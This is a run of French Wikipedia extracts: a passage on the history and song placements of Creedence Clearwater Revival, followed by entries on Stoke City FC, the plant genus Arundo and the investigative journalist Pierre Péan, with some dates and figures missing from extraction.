Très timide, John Fogerty se refuse d'abord à chanter mais la formation instrumentale se forge peu à peu une réputation de groupe d'accompagnement souvent mis à contribution par une maison de disques locale. Les Blue "Velvets" enregistrent même un morceau de sa composition, "Beverly Angel".
Depuis plusieurs années, Tom Fogerty, frère aîné de John, écume également les bals en qualité d'auteur-compositeur-interprète et guitariste, dans un groupe appelé Spider Webb And The Insects. À ce titre, il est déjà une célébrité à Oakland et Berkeley. En 1959, alors que les Spider Webb viennent de se séparer, c'est tout naturellement que Tom Fogerty, fiancé et gagnant sa vie en travaillant en usine, déjà chanteur occasionnel pour la formation de son frère, l'intègre alors à plein temps.
Forts d'un nouveau chanteur, les Tommy Fogerty And The Blue Velvets commencent immédiatement l'enregistrement de maquettes, tout en continuant leurs tournées habituelles, jusqu'à ce qu'en 1961, un label local, Orchestra, leur propose d'enregistrer plusieurs de leurs compositions, notamment "Come On Baby" et "Yes You Did", respectivement édités en 1961 et 1962. Très conventionnels et fortement marqués par les goûts musicaux de Tom Fogerty, aucun des titres édités sous ce label n'obtient le moindre succès.
En 1964, The Blue Velvets signent finalement avec une filiale d'Universal Music basée à San Francisco, Fantasy Records. Désireux de surfer sur la beatlemania, le directeur du label est convaincu que le nom du groupe doit sonner plus anglais. Il les rebaptise d'abord The Visions, mais c'est sous le nom de The Golliwogs (en référence à un personnage de la littérature enfantine) qu'ils sortiront leurs premiers 45 tours, sans cesser de multiplier les dates dans des lieux les plus divers.
De 1964 à 1966, la formation enchaîne les singles, toujours sans grand succès. Seul "Brown-Eyed Girl" sorti en 1965 s'écoule à exemplaires. Au fil des mois, le rôle de chacun est redéfini : Stu Cook abandonne peu à peu le piano au profit de la basse et Tom Fogerty renforce la rythmique à la guitare. Aguerri par des années de concerts dans des conditions difficiles, John Fogerty accroît son influence dans le groupe. Au fil des morceaux, sa virtuosité grandit et on commence à remarquer sa voix rocailleuse dans les chœurs de "Try Try Try" ou encore dans "Little Tina".
Malgré deux années d'efforts, The Golliwogs ne parviennent pas à se faire un nom : John Fogerty doit travailler comme coursier pour la maison de disques, Tom Fogerty est ouvrier d'usine, Stu Cook et Doug Clifford, quant à eux, poursuivent leurs études à l'Université de San José. Mais c'est sans relâche qu'ils se réunissent pour les répétitions et autres représentations.
Coup dur supplémentaire pour le groupe, John Fogerty et Doug Clifford sont appelés sous les drapeaux en 1966.
Creedence Clearwater Revival.
1967-1968 : premiers succès.
En 1967, un des cadres de Fantasy, Saul Zaentz, rachète la maison de disques. Plus en phase avec la jeune scène rock que son prédécesseur, il pressent le potentiel des Golliwogs et leur promet d'éditer un album à condition qu'ils rebaptisent leur groupe. Très vite, les quatre compagnons choisissent un nom inhabituel composé de la juxtaposition de trois termes sans signification apparente : « Creedence Clearwater Revival » (foi, eau-claire, renaissance). Chacun de ces mots a été choisi en réalité pour une raison bien précise :
CCR entre alors en studio pour enregistrer son premier LP, "Creedence Clearwater Revival", un patchwork de cinq compositions des frères Fogerty et trois reprises de leurs chansons préférées. Trois simples en seront extraits : "I Put a Spell on You" de Screamin' Jay Hawkins, "Porterville", écrit par John Fogerty et une version fleuve de "Susie Q" de Dale Hawkins (qui devra être scindée en deux parties pour les besoins du 45 tours). Très vite, toutes les radios rock de la Côte Ouest passent ce dernier morceau en boucle. Le public découvre alors le jeu de guitare tout en trémolos de John Fogerty et la rythmique hypnotique de Creedence, le « Bayou Rock » : un style musical à la croisée des chemins de la Country Music et des vieux blues de La Nouvelle-Orléans. Bien que le groupe soit empêché de partir en tournée à cause de Doug Clifford et John Fogerty qui ne sont pas encore totalement libérés de leurs obligations militaires, l'album s'écoulera rapidement à plus d'un million d'exemplaires et restera classé un an et demi dans le hit parade américain.
1969 : de Bayou Rock à Woodstock.
En mars 1969, Creedence édite un 33 tours à contre-courant du psychédélisme ambiant : plus encore que son prédécesseur, "Bayou Country" évoque la moiteur marécageuse de la Louisiane.
Le 45 T extrait de l'album, "Proud Mary", fait l'éclatante démonstration du talent de compositeur, mais aussi de conteur, de John Fogerty. Celui-ci puise au plus profond de l'inspiration du blues pour évoquer un passé imaginaire de travailleur sur les rives du fleuve Mississippi, alors qu'il n'y a jamais mis les pieds. Rapidement, "Proud Mary" dépasse le million d'exemplaires vendus des deux côtés de l'Atlantique et devient un standard repris et adapté par d'innombrables groupes et chanteurs, notamment Ike &amp; Tina Turner, Elvis Presley, Bob Dylan ou Johnny Hallyday.
L'album suivant "Bayou Country" reste classé 13 semaines dans le top 10 des charts américains. L'année 1969 est déterminante pour le groupe, qui bat tous les records d'affluence pour sa tournée promotionnelle, alors qu'il sort déjà deux simples ("Bad Moon Rising" et "Lodi"), qui annoncent un album en préparation. CCR est alors considéré comme le groupe le plus populaire des États-Unis.
Le , Creedence clôt sa tournée au festival de Woodstock. Les hasards de la programmation relèguent la prestation du groupe à une heure tardive de la nuit, face à un public disséminé à la suite de la piètre prestation du Grateful Dead, entre autres perturbée par des problèmes techniques. Lorsque Creedence monte sur scène aux alentours de trois heures du matin, ils doivent faire face à un demi-million de spectateurs endormis.
Déçus et agacés des conditions dans lesquelles ils ont dû se produire, les membres de Creedence refuseront d'apparaître dans le film qui sortira l'année suivante, les producteurs voulant utiliser les images tournées sur "Bad Moon Rising". Néanmoins, lors d'une réédition à l'occasion du de l'événement, ils restitueront de larges extraits de leur prestation.
Dès l'automne 1969, l'album "Green River" confirme le talent créatif de John Fogerty : même si la construction reste similaire d'un morceau à l'autre — les parties de chant sont presque systématiquement ponctuées de courts chorus de guitare sur la seizième mesure de chaque phrase — "Green River" est marqué par l'inventivité mélodique et la maîtrise des effets sonores. Dès sa sortie, l'album entre au Top Ten des charts et y reste durant 15 semaines.
Les deux 45 tours extraits de l'album, "Green River", à la sonorité inquiétante appuyée par un effet de réverbération et l'entraînant "Bad Moon Rising", atteignent la seconde place des meilleures ventes des 45 Tours. Difficile de rivaliser face à des titres comme "Get Back" des Beatles ou "Honky Tonk Women" des Rolling Stones.
1970 : l'année de la consécration.
En janvier 1970, soit cinq mois après "Green River", sort "Willy and the Poor Boys" qui s'installera onze semaines dans le Top Ten. Assis sur une rythmique variée, Creedence explore et réinvente tous les genres de la musique populaire américaine : de la soul de "Down on the Corner" (enregistré au coin d'une rue à l'aide d'un magnétophone portable) au rock dur et menaçant de "Fortunate Son" (où John Fogerty fait la démonstration de ses performances vocales), en passant par le bluegrass de "Cotton Fields", etc.
À l'heure où la surenchère d'effets spéciaux et la sophistication orchestrale sont habituellement de mise - à l'instar du « wall of sound » Spectorien - "Willy and the Poor Boys" brille par sa production sans artifices. L'album est sans conteste le plus varié, le plus spontané et le plus lyrique de Creedence Clearwater Revival. Aujourd'hui encore, il est considéré comme un des cinq-cents albums de rock les plus marquants des cinquante dernières années, par les magazines "Rolling Stone" aux États-Unis et "Rock &amp; Folk" en France.
Le groupe part pour une longue tournée aux quatre coins des États-Unis mais aussi de l'Europe. Leur prestation au Oakland Coliseum fait l'objet d'une captation en vue d'une sortie de leur premier album live qui sera finalement un album posthume puisqu'il ne sera édité qu'en 1980, soit plusieurs années après la séparation de CCR. À noter que le premier pressage de cet album annoncera par erreur un enregistrement au Royal Albert Hall de Londres. De nouvelles pochettes seront rapidement réimprimées.
C'est en août 1970 que Creedence publie ce qui restera son plus gros succès commercial avec "Cosmo's Factory" (certifié disque d'or la même année et écoulé, en 2009, à plus de quatre millions d'exemplaires). Malgré l'usage des recettes éprouvées dans les albums précédents, John Fogerty franchit le cap d'une production plus élaborée pour certains morceaux, à l'image de ce saxophone ronronnant de "Travelin' Band" et "Long As I Can See The Light" ou bien encore de la slide guitare de "Ramble Tamble".
Creedence affiche clairement ses partis pris politiques avec la ballade nostalgique "Who'll Stop the Rain" (en face B du 45 tours "Travelin' Band"), une métaphore de l'enlisement des États-Unis au Viêt Nam emblématique des préoccupations de l'Amérique de cette fin des sixties. La reprise de la chanson de Gladys Knight "I Heard It Through the Grapevine" (qui ne sortira en simple qu'en 1976) est 
Le 33 tours, qui reste près de cinq mois dans le Top Ten des meilleures ventes (dont neuf semaines à la première place) fait de Creedence Clearwater Revival le groupe le plus populaire de 1970 aux États-Unis.
1971-1972 : le déclin et la séparation.
En ce début d'année 1971, tout semble sourire à Creedence, mais des tiraillements commencent à se faire sentir. Tom Fogerty décide de prendre ses distances pour « consacrer du temps à sa famille » ; au détour d'une interview pour le magazine "Rolling Stone", Stu Cook critique ouvertement l'attitude hégémonique de John Fogerty et son manque de respect pour les autres membres du groupe.
Dès la fin des sessions d'enregistrement du cinquième 33 tours, Tom Fogerty quitte définitivement le groupe et, à la sortie de "Pendulum" en , force est de constater que John Fogerty reste l'unique compositeur, arrangeur et producteur d'un album qui confirme le tournant amorcé avec "Willy and the Poor Boys" : ce dernier délaisse sa Gibson Les Paul pour l'orgue Hammond dans de nombreux morceaux : "Sailor's Lament", "Hideway", "It's Just a Thought", etc. Se dégage tout de même la ballade "Have You Ever Seen the Rain?" qui sera éditée en 45 tours.
Même si l'album atteint des chiffres de ventes respectables (il sera certifié disque d'or dès ), il est moins inventif, moins dense que ses prédécesseurs ; le soin apporté par John Fogerty à la production des morceaux cache mal ses défaillances et témoigne du malaise ambiant.
CCR, amputé d'un de ses membres, entreprend en trio une tournée mondiale dont sortira un disque, fin 1973, "Live In Europe".
Il semble alors évident, pour Stu Cook et Doug Clifford, que le groupe ne sert qu'à mettre en avant les aspirations de John Fogerty. "Mardi Gras", sorti en 1972 devait être l'album du renouveau en marquant l'avènement de la démocratie au sein du groupe. À l'exemple des Beatles, chacun y exprime librement sa créativité et chante les chansons de sa composition : Stu Cook quatre titres, Doug Clifford deux et John Fogerty trois. Mais seule une des compositions de ce dernier sera jugée digne par la maison de disques d'être éditée en 45 tours : "Someday Never Comes". Le résultat donne un album décousu, sans homogénéité et, surtout, des chansons dans lesquelles passent les tensions qui se sont installées dans le groupe. À noter que le 45 tours simple "Sweet Hitch-Hiker / Door to Door" était paru auparavant. Le verdict est sans appel : l'album, laminé par les critiques et boudé par le public, sonne définitivement le glas de Creedence Clearwater Revival, dont les membres annoncent la cessation définitive d'activité le . En fait, c'est John qui claque la porte, car il estime avoir fait assez de concessions à ses deux acolytes et n'est plus enclin à poursuivre une aventure "partagée" (compositions, interprétations, etc.) dont il devine l'échec. De plus, son album solo, clairement orienté country (reprises de chansons traditionnelles), est déjà en préparation et "Mardi Gras" en constitue une sorte d'ébauche.
Après Creedence.
John Fogerty édite son premier album solo, "The Blue Ridge Rangers" sous le label Fantasy Records, qu'il quitte rapidement pour rejoindre l'écurie d'Asylum Records. À la suite de démêlés judiciaires avec son ancienne maison de disques, détentrice des droits du groupe, il refusera longtemps de jouer les chansons de Creedence en concert (il évoquera d'ailleurs la cupidité de son ancien employeur, Saul Zaentz, dans deux compositions : "Vanz Kant Danz" et "Mr Greed" qui lui vaudront un procès). Malgré une carrière en dents de scie, il éditera pas moins de onze albums. L'anachronique "Centerfield", en 1985, qui restera classé trente-huit semaines parmi les meilleures ventes des États-Unis, marquera son retour dans le giron de Fantasy.
Tom Fogerty, quant à lui, tente de faire carrière, sans grand succès. Il sortira tout de même trois 33 tours ainsi qu'un single, "Joyful Resurrection", en collaboration avec Doug Clifford et Stu Cook, où il décrit son espoir d'une reformation de CCR. Ses maux de dos le conduisent à l'hôpital pour subir une opération au cours de laquelle du sang contaminé par le VIH lui sera transfusé. Il meurt le d'une tuberculose corrélative à la maladie, enterrant avec lui tout espoir de reformation du groupe.
Doug Clifford et Stu Cook verraient bien Tony Joe White succéder à John Fogerty pour continuer l'aventure (lucrative) CCR. Ils le contactent et tentent de le persuader, mais celui-ci décline la proposition. La même année 1972, Doug Clifford fait paraître son unique album solo sur Fantasy (n° 9411). Il l'a sobrement baptisé de son surnom : « Cosmo ». Stu Cook y tient la guitare rythmique, tandis que Donald "Duck" Dunn est à la basse. Doug Clifford et Queen Bishop signent toutes les compositions originales de cet album qui se veut riche musicalement et qui contient trois reprises. Le style oscille entre rhythm'n'blues, soul et country. Cet effort discographique n'ayant recueilli qu'un succès d'estime, Doug et Stu prennent alors une retraite dorée, entrecoupée de collaborations épisodiques, notamment pour l'éphémère projet Don Harrison Band en 1977. À noter que Doug Clifford a repris en 1983 son rôle de batteur au sein du Sir Douglas Quintet, le groupe de Doug Sahm (cf. l'album "Midnight sun" paru la même année chez Sonet, incluant leur tube "Meet me in Stockholm"). En 1995, ils se réunissent à nouveau pour former un groupe nommé "Creedence Clearwater Revisited" , essentiellement consacré à la scène. Deux albums live sont parus sur CD. Le premier, "Recollection" (concert au Canada en ), semble le plus remarquable car il permet à l'auditeur de mesurer la ferveur du public, qui n'a absolument rien oublié du CCR, malgré les années écoulées.
Adaptations et bandes-son.
La chanson "The Midnight Special" de l'album "Willy and the Poor Boys" est un point fort du film "La Quatrième Dimension", car le prologue commence avec (le chauffeur et le passager d'une voiture sur une route déserte) et le quatrième court-métrage finit dessus (dans l'ambulance avec le chauffeur qui n'est autre que le passager de la voiture du prologue), bouclant ainsi l'histoire avant l'épilogue. Ce morceau a été repris par Eddy Mitchell en 1977 sous le titre "Laisse tomber le ciel", sur son album "La Dernière Séance".
Le titre "Fortunate Son", du même album, est utilisé dans les films "Forrest Gump", "Apocalypse Now," ', "Battleship", "Les Petits Mouchoirs" et "Suicide Squad", ainsi que dans la bande originale des jeux vidéo "Battlefield Vietnam", "Rock Band" (en contenu téléchargeable), "," l'add-on ', "Grand Theft Auto V" et dernièrement dans "Watch Dogs 2" dans l'application Media Player. Il a été repris par les Circle Jerks sur leur album "VI", (en 1987).
La chanson "Up around the Bend" est utilisée dans le film "Michael" et est également jouable dans le jeu "Guitar Hero World Tour".
Adapté par Philippe Labro sous le titre "Fils de Personne", "Fortunate Son" est également repris en français par Johnny Hallyday sur l'album "Flagrant délit", sorti en 1971. Il reprend également "Born On the Bayou" ("Dans le bayou") et "Proud Mary" ("Rouler sur la rivière"), adaptés par Jean Fauque sur son album "Destination Vegas", en 1996.
En 1998, "Proud Mary" ("Rouler sur la rivière") est joué à deux reprises (fuite en voiture et générique de fin) dans le film "L'Enjeu" ("Desperate Measures") de Barbet Schroeder.
On retrouve aussi "Born On the Bayou" dans les films "Waterboy" (1998) de Frank Coraci, "" (1989) de Jim Wynorski , "Stop-Loss" et "Chasse à l'homme" (1993) de John Woo. Sous le titre "Né dans le bayou", Francis Cabrel l'a également adapté sur son album "Des roses et des orties" (2008).
Les titres "Lookin' Out My Back Door" ainsi que "Run Through the Jungle" sont notamment utilisés dans le film "The Big Lebowski" (1997) de Joel et Ethan Coen. "Lookin' Out My back Door" figure aussi, en tant que titre d'ouverture, dans un album de reprises de Children of Bodom, intitulé "Skeletons in the Closet". La chanson a aussi été reprise par Stray Cats, sortie en face B d'un de leur 45 tours.
"Run Through the Jungle" figure également dans la bande originale de "Air America" (1990) de Roger Spottiswoode, ainsi que dans la scène finale de l'épisode 9 de la seconde saison de la série télévisée "Fargo".
La chanson "Have You Ever Seen the Rain?" est utilisée dans le dernier épisode de la série "Stargate SG-1", dans l'épisode 9 de la première saison de la série "Dexter" et également dans le premier épisode de la série "". Elle a également été reprise par Spin Doctors, Bonnie Tyler et les Minutemen.
"Green River" est présente dans la bande son du jeu "", elle est diffusée par la station de radio K - DST. On peut aussi entendre la chanson dans le film "The Indian Runner" de Sean Penn. Cette chanson a été reprise par Eddy Mitchell en 1970, sous le titre "Le Jardin de l'Eden", sur son album "Mitchellville". Ce même Eddy Mitchel reprend La chanson "Down on the Corner" en 1970 sous le titre "J'aurai sa fille", paru à l'origine sur un Super 45 tours, puis compilé sur plusieurs CD, dont "Tout Eddy 65/70" et "Rock 'n' Roll".
Le titre "Long As I Can See the Light" est utilisé à la fin du film "Jeux de pouvoir" (2008), ainsi que dans l'épisode 23 de la saison 1 de la série Las Vegas.
Les acteurs de la série télévisée "Glee" ont repris une chanson "Proud Mary" dans le de la première saison : "Suzie Q", dans le film "Apocalypse Now" de Francis Ford Coppola (1979), interprété par Flash Cadillac and the Continental Kids pendant la scène du concert des Bunnies de "Playboy", sur le Mékong. Le morceau "Suzie Q" est utilisé dans l'épisode 23 de la Saison 10 d'Esprits criminels et sert de bande son à la pub pour les gaufres Suzy de la marque belge Lotus.
Les titres "Keep On Chooglin" et "Born On the Bayou" font partie de la bande son des films "Bande de sauvages" en 2007, puis "", de et avec Sylvester Stallone, en 2010.
Le titre "Bad Moon Rising" figure également dans la bande originale du film de John Landis "Le Loup-garou de Londres", sorti en 1981.

</doc>
<doc id="248940" url="https://fr.wikipedia.org/wiki?curid=248940" title="Stoke City Football Club">
Stoke City Football Club

Stoke City Football Club est un club de football anglais basé à Stoke-on-Trent dans le Staffordshire (Angleterre) et évoluant en Championship. Fondé en 1863, le club est le plus ancien de la Premier League et le deuxième club professionnel le plus ancien du monde, juste après Notts County.
Depuis la saison 2018-2019 le club évolue en EFL Championship (deuxième division anglaise). Il a remporté son premier et seul trophée majeur en 1972 en remportant la Carling Cup contre Chelsea sur le score de 2 à 1. Mais il a aussi remporté deux fois le Johnstone’s Paint Trophy en 1992 (contre Stockport County sur le score de 1 à 0) et en 2001 (contre Bristol City sur le score de 2 à 1). Sa meilleure performance en première division anglaise fut lors de la saison 1935-1936 où il finit quatrième du championnat et lors de la saison 1946-1947 il finit une nouvelle fois à cette place. En FA Cup, il a eu une seule fois l'occasion d'atteindre la finale, le , en affrontant Manchester City pour essayer de remporter son deuxième titre majeur. Avant cette finale, sa meilleure performance était la demi-finale atteinte par trois fois, en 1899 (défaite contre Derby County sur le score de 3-1), en 1971 (défaite contre Arsenal sur le score de 4-2 au total des deux matchs joués) et en 1972 (défaite contre Arsenal une nouvelle fois, sur le score de 3 à 2 au total des deux matchs joués).
Stoke joue ses matchs à domicile au Bet365 Stadium, depuis 1997. Le stade a une capacité de mais fut réduit à . Avant d'évoluer dans ce stade, Stoke évoluait au Victoria Ground qui avait une capacité de mais qui fut réduit à après sa fermeture en 1997.
Son surnom "The Potters" leur vient de la tradition de la ville de Stoke-on-Trent qui est la poterie.
Histoire.
Stoke City FC est un club anglais de football basé à Stoke-on-Trent, créé en 1863 sous le nom "Stoke Ramblers". En 1878, le club déménage à Victoria (où ils jouèrent jusqu'en 1997) et fusionne avec Stoke Victoria Cricket Club pour devenir le "Stoke Football Club". Le club rejoint la "Football League" lors de la création de celle-ci en 1888, ce qui en fait le deuxième plus vieux club de la Ligue. 
En 1928, le club est rebaptisé pour la dernière fois "Stoke City Football Club", lorsque Stoke-on-Trent acquiert le statut de ville. Le , assistent à la réception d'Arsenal, ce qui constitue le record d'affluence du club.
En 1972, le club remporte son seul grand trophée : la "", en gagnant contre Chelsea 2-1 en finale au stade de Wembley, devant .
En 1985, le club est relégué de Premier League avec un total de 17 points, score battu par Sunderland en 2005-2006 (15 pts) puis par Derby County en 2007-2008 (11 pts). En 1997, le club déménage au Britannia Stadium, et le Victoria est détruit. 
Après 23 ans d'absence en première division, lors de la saison 2007-2008, Stoke obtient sa promotion pour la Premier League en terminant deuxième du Championship (seconde division anglaise). En 2008-2009, l'équipe de Stoke termine de Premier League alors même que le club était favori pour la relégation. En 2009-2010, Stoke améliore encore ses performances et termine .
En 2010-2011, l'équipe se maintient à nouveau sans difficulté en terminant . En FA Cup, après avoir largement battu Bolton (5-0) en demi-finale (le plus gros écart à ce stade de la compétition depuis 72 ans), Stoke atteint la finale pour la première fois de son histoire. Battus par Manchester City (1-0), les Potters décrochent une qualification pour la Ligue Europa.
Pour sa participation en Ligue Europa Ils finiront deuxième de leur groupe derrière Beşiktaş JK et sera éliminé par Valence CF en seizièmes de finales. 
Après une très mauvaise saison en Premier League 2017-2018, le club est relégué en Championship au bout de la de championnat contre Crystal Palace sur une défaite 2-1 à domicile. Le club était présent dans l'élite depuis la saison 2008-2009.
Joueurs et personnalités du club.
Entraîneurs.
Le tableau suivant présente la liste des entraîneurs du club depuis 1874.
Effectif actuel.
"Le 12 août 2025"

</doc>
<doc id="248941" url="https://fr.wikipedia.org/wiki?curid=248941" title="Stoke City">
Stoke City



</doc>
<doc id="248942" url="https://fr.wikipedia.org/wiki?curid=248942" title="Chambres de commerce et d'industrie">
Chambres de commerce et d'industrie



</doc>
<doc id="248943" url="https://fr.wikipedia.org/wiki?curid=248943" title="Arundo">
Arundo

"Arundo" est un genre végétal de la famille des Poacées, sous-famille des "Arundinoideae". 

</doc>
<doc id="248944" url="https://fr.wikipedia.org/wiki?curid=248944" title="Pierre Péan">
Pierre Péan

Pierre Péan, né le à Sablé-sur-Sarthe et mort le à Argenteuil, est un journaliste d'enquête et essayiste français.
Biographie.
Origines et débuts.
Pierre Péan est le fils d’Eugène Péan, coiffeur à Sablé-sur-Sarthe, et d'Alice Gougeon, son épouse. Sa famille, cependant, est originaire de l'est de la Loire-Atlantique et des territoires tout proches, de la Mayenne et du Maine-et-Loire. Il étudie le droit, section sciences économiques, à Angers. C'est là qu'il fait partie de l'équipe électorale de Jean Turc, maire de la ville membre du parti Indépendants et Paysans (droite). En 1958, il est également aux côtés de Joël Le Theule, maire de Sablé-sur-Sarthe, qui deviendra député et ministre gaulliste. Puis il continue ses études à Sciences Po et parvient à éviter le service militaire en Algérie. Il effectue seulement son service national, au titre de la coopération, de 1962 à 1964 au Gabon.
En 1960, il est attaché de cabinet d'Henri Rochereau, ministre de l'Agriculture dans le gouvernement de Michel Debré.
Il assiste à la tentative de coup d'État militaire contre le président Léon Mba. Il gardera de cette période un réseau de relations parmi les élites gabonaises.
Journaliste d'initiative.
À partir de 1968, il devient journaliste, tout d'abord pour l'Agence France-Presse jusqu'en , avant de partir à "L'Express" de Françoise Giroud enquêter sur le premier choc pétrolier, les dossiers de l'OPEP, les services secrets et le Moyen-Orient.
En 1974, il est recruté par le "Nouvel Économiste", après son premier livre, puis par "Le Canard enchaîné", où il suit l'affaire des Avions renifleurs, débutée en et publie le premier article sur l'« affaire des diamants », impliquant le président Valéry Giscard d'Estaing, révélée en par l'hebdomadaire satirique "Le Canard enchaîné". Il obtient son premier grand succès éditorial avec "Affaires africaines" (1983) où il dénonce les réseaux mis en place par Jacques Foccart, notamment au Gabon.
Par la suite, il collabore à différents journaux ("Libération", "Actuel", "Le Canard enchaîné") en tant que pigiste extérieur, en choisissant ses sujets, et publie au rythme d'environ un livre par an.
En 1989, s'opposant à un projet immobilier dans la commune de Bouffémont (Val-d'Oise), où il réside depuis le début des années 1970, il conduit une liste politique alternative mêlant des militants écologistes et d'extrême gauche contre le maire sortant socialiste.
Entre 2008 et 2010, il est conseiller municipal à Maumusson (Loire-Atlantique), où il possède une propriété à partir de 2001.
Il meurt à l'âge de , le , à l’hôpital d'Argenteuil (Val-d'Oise). Il est enterré au cimetière de Bouffémont.
Publications et accueil médiatique.
Il a publié plus de quarante ouvrages depuis 1975. Certains ont été des succès, comme "TF1, un pouvoir", écrit en collaboration avec Christophe Nick, ou "l'Argent noir" ou encore "Une jeunesse française – François Mitterrand, 1934-1947" , dans lequel il révèle que le président socialiste a reçu la décoration de l'ordre de la Francisque des mains du maréchal Pétain. Il a ensuite regretté certaines interprétations parues dans la presse, qu'il juge contraires à sa démonstration et beaucoup trop sévères pour François Mitterrand. Il s'en est expliqué dans "Dernières volontés, derniers combats, dernières souffrances".
Il s'est particulièrement intéressé, sans s'y limiter, aux scandales politiques (articles sur l'« affaire des diamants » de Giscard pour "Le Canard enchaîné" ; "Affaires africaines", sur le Gabon, pays symbole des relations franco-africaines souterraines et affairistes ; "V", sur l'affaire des Avions renifleurs ; "L'Argent noir", sur la corruption dans les pays du Sud) et aux affaires étouffées ("Manipulations africaines", sur l'attentat contre l'avion d'UTA). Son essai biographique sur Jacques Foccart lui a valu un procès, qu'il a gagné.
Depuis le début des années 1990, il a diversifié ses enquêtes. Certaines portent sur des sujets historiques et non plus d'actualité : "Le Mystérieux Docteur Martin", biographie de Henri Martin, l'un des plus grands comploteurs français du , lié à la Cagoule et aux activistes de l'Algérie française ; "L'Extrémiste", sur le Suisse François Genoud, exécuteur testamentaire d'Adolf Hitler et financier de certains groupes terroristes ; "La Diabolique de Caluire", sur la dénonciation de Jean Moulin ; "Main basse sur Alger", ouvrage consacré aux motifs secrets de l'expédition contre Alger, en 1830.
Ses ouvrages lui ont valu de vives réponses de la part de certaines personnes visées, et des commentaires élogieux dans une partie de la presse. Christine Mital écrit dans "Le Nouvel Observateur" du à son propos : « Il se veut enquêteur. Et enquêteur seulement. Disons qu'en tout cas il appartient à une espèce rare : celle qui prend du temps avant d'écrire. […] Péan […] n'a jamais dérogé à sa méthode. »
Lui-même ne se qualifie pas de journaliste d'investigation, selon lui une francisation venue du scandale du Watergate, ni comme journaliste d'enquête, car il reproche à la plupart de ces journalistes de relayer des enquêtes faites par le système judiciaire ou d'être manipulées par des personnes qui leur apportent des informations, mais plutôt comme un journaliste d'initiative, amorçant sa propre recherche.
Dans un article publié en par "Le Monde diplomatique", Pierre Péan cite un article qu'il attribue au journaliste israélien Amir Oren, selon lequel le massacre de Sabra et Chatila (Liban, 1982) aurait été planifié par les Israéliens. Selon une enquête publiée en par "L'Arche", cette citation est un faux. Pierre Péan n'a jamais tenté de justifier ses affirmations. De son côté, "Le Monde diplomatique" a publié en une note précisant que 
En 2003, il publie avec Philippe Cohen "La Face cachée du Monde", livre d'investigation qui critique le fonctionnement du journal français "Le Monde", et plus particulièrement celui de sa direction tripartite de l'époque, composée de Jean-Marie Colombani, Edwy Plenel et Alain Minc. Le livre connaît un succès commercial atteignant plus de vendus au total avant qu'au terme d'une procédure de médiation, les auteurs n'acceptent de ne procéder à aucun retirage du livre.
En février 2009, la publication d'un livre d'enquête critique sur Bernard Kouchner, "Le Monde selon K.", déclenche une polémique nationale.
En 2017, le tribunal correctionnel de Paris condamne Pierre Péan pour diffamation contre le président gabonais Ali Bongo pour son ouvrage "Nouvelle affaires africaines, mensonges et pillages du Gabon". L'auteur se satisfait cependant du verdict, son avocate notant que Pierre Péan a été condamné pour des détails concernant une tentative d'assassinat sur un opposant gabonais et que « toutes les demandes de publication » du verdict d'Ali Bongo ont été rejetées par le tribunal.
Françafrique.
Pour le quotidien belge "Le Soir", Pierre Péan , son livre de 1983 "Affaires africaines" étant une , qui lui valut des menaces de mort, les foudres d'Omar Bongo, un cambriolage de sa maison, une bombe explosant devant son garage et une camionnette lui fonçant dessus.
Livres.
"Noires fureurs, blancs menteurs".
Son ouvrage "Noires fureurs, blancs menteurs. Rwanda, 1990-1994" est consacré aux accusations portées contre la politique française au Rwanda, qu'il s'attache à réfuter, et aux accusateurs, à qui il attribue des liens avec le Front patriotique rwandais (FPR).
Dans cet ouvrage de 544 pages, publié en , Pierre Péan entend mettre un terme à l'ensemble des accusations, injustes selon lui, formulées à l'encontre de la France, de sa politique au Rwanda entre 1990 et 1994, et à l'encontre de l'armée française. L'auteur affirme s'appuyer sur une enquête approfondie et l'accès à des documents inédits pour établir les points suivants :
Pierre Péan revient sur ces événements dans son livre "Carnages" (2010) et souligne le rôle de la diplomatie américaine au Rwanda. Selon lui les États-Unis bloqueraient toute tentative d'enquête sur les auteurs de l'attentat du .
Le livre a fait l'objet de nombreuses critiques et d'une plainte pour de la part de SOS Racisme et de l'association Ibuka (Pierre Péan a été relaxé en première instance, et en appel le ). En , la Cour de cassation a définitivement débouté ces associations.
Pierre Péan était accusé par ses détracteurs d'avoir écrit un livre « sur commande » juste pour minimiser les responsabilités françaises dans le génocide des Tutsi au Rwanda. Cette interprétation semble soutenue par le quotidien "La Libre Belgique" (), qui, lui-même, est accusé de partialité par M. Péan dans son livre. Pour RFI, rien ne justifie les mises en cause de la Radio par Pierre Péan (qu'il a présentée comme un « lobby » du FPR). Pour sa part, le président du Conseil national de l'Église réformée de France s'est élevé contre les critiques de Pierre Péan et lui renvoie l'accusation de « désinformation ».
Sur le site Conspiracy Watch, Rudy Reichstadt explique que le contenu du rapport du juge Trévidic sur l'attentat contre le président Habyarimana annihile la théorie de Péan sur le « complot tutsi ».
Dans la tribune de "Libération" du , Raphaël Glucksmann, en stigmatisant le « fiasco moral et géopolitique de la Françafrique » au Rwanda, qualifie Pierre Péan du « plus actif des révisionnistes ». Quant au journaliste d'investigation Jean-François Dupaquier, il épingle Pierre Péan comme « le polémiste affairé à laver François Mitterrand et son équipe de toute accusation d'avoir trempé dans la préparation du génocide des Tutsi ».
"Le Monde selon K".
Dans ce livre publié en février 2009, Pierre Péan a enquêté sur Bernard Kouchner, ministre des Affaires étrangères à l'époque de la parution du livre. Comme l'explique Péan dans le premier chapitre de ce livre très polémique, c'est à propos du Rwanda et de la nouvelle politique menée par Kouchner à l'égard de ce pays depuis que ce dernier est au Quai d'Orsay que lui, Péan, s'est vraiment intéressé à Kouchner. De fait, après une centaine de pages mettant en lumière les aspects les moins reluisants de l'ensemble de la carrière de Kouchner, une petite centaine de pages est consacrée au Rwanda.
Le chapitre 10 du livre concerne la journaliste Christine Ockrent en même temps directrice de France Monde et compagne du ministre des Affaires étrangères. Le chapitre 11 répond à l'intention exprimée dans le premier chapitre d'analyser le de Kouchner et . Dans ce onzième chapitre, Péan tente de montrer que la « vision du monde » commune de Kouchner et de Bernard-Henri Lévy, qui se réclame du droit d'ingérence est en fait identique à celle des néoconservateurs américains. Les valeurs gaullistes de l'indépendance nationale seraient « honnies » par les deux hommes .
